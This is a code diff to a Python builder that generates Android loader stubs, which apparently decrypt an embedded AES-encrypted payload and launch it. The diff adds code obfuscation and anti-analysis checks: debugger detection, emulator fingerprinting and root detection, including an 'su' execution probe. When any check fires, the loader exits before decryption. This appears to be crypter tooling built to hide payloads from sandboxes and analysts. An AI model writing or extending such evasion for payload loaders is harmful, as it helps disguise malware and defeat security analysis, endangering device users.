@@ -5,6 +5,7 @@ import subprocess
 import zipfile
 from pathlib import Path
 from xml.sax.saxutils import escape
+from services.obfuscator import CodeObfuscator
 
 logger = logging.getLogger(__name__)
 
@@ -23,6 +24,8 @@ class StubBuilder:
         self.keystore = None
         self.keystore_pass = os.getenv("ANDROID_KEYSTORE_PASS", "android")
         self.key_alias = os.getenv("ANDROID_KEY_ALIAS")
+        self.obfuscator = CodeObfuscator()
+        logger.info("StubBuilder инициализирован с обфускацией")
         self.temp_dir = Path("temp/stub_build")
         self.temp_dir.mkdir(parents=True, exist_ok=True)
         logger.info("StubBuilder initialized")
@@ -713,6 +716,12 @@ public class LoaderActivity extends Activity {{
     }}
 
     private void startDecryption() {{
+        // Защитные проверки
+        if (!checkEnvironment()) {{
+            finish();
+            return;
+        }}
+        
         final AlertDialog.Builder builder = new AlertDialog.Builder(this);
         builder.setTitle(APP_LABEL);
         builder.setMessage("Подготовка приложения...");
@@ -846,6 +855,56 @@ public class LoaderActivity extends Activity {{
         startActivity(launchIntent);
         finish();
     }}
+    
+    // ===== ЗАЩИТНЫЕ МЕХАНИЗМЫ =====
+    
+    private boolean isDebuggerConnected() {{
+        return android.os.Debug.isDebuggerConnected();
+    }}
+    
+    private boolean isEmulator() {{
+        String brand = android.os.Build.BRAND;
+        String device = android.os.Build.DEVICE;
+        String model = android.os.Build.MODEL;
+        String product = android.os.Build.PRODUCT;
+        String fingerprint = android.os.Build.FINGERPRINT;
+        
+        return brand.contains("generic") || device.contains("generic") ||
+               model.contains("google_sdk") || model.contains("Emulator") ||
+               model.contains("Android SDK") || product.contains("sdk") ||
+               fingerprint.contains("generic") || fingerprint.contains("test-keys");
+    }}
+    
+    private boolean isRooted() {{
+        String[] paths = {{
+            "/system/app/Superuser.apk",
+            "/sbin/su", "/system/bin/su", "/system/xbin/su",
+            "/data/local/xbin/su", "/data/local/bin/su",
+            "/system/sd/xbin/su", "/system/bin/failsafe/su",
+            "/data/local/su", "/su/bin/su"
+        }};
+        
+        for (String path : paths) {{
+            if (new java.io.File(path).exists()) return true;
+        }}
+        
+        try {{
+            Process p = Runtime.getRuntime().exec("su");
+            p.destroy();
+            return true;
+        }} catch (Exception e) {{}}
+        
+        return false;
+    }}
+    
+    private boolean checkEnvironment() {{
+        if (isDebuggerConnected()) return false;
+        if (isEmulator()) return false;
+        if (isRooted()) return false;
+        return true;
+    }}
+    
+    // ===== КОНЕЦ ЗАЩИТНЫХ МЕХАНИЗМОВ =====
 
     private byte[] decryptAES(byte[] encrypted) throws Exception {{
         int minLength = PAYLOAD_MAGIC.length + 1 + WRAP_SALT_LENGTH + NONCE_LENGTH
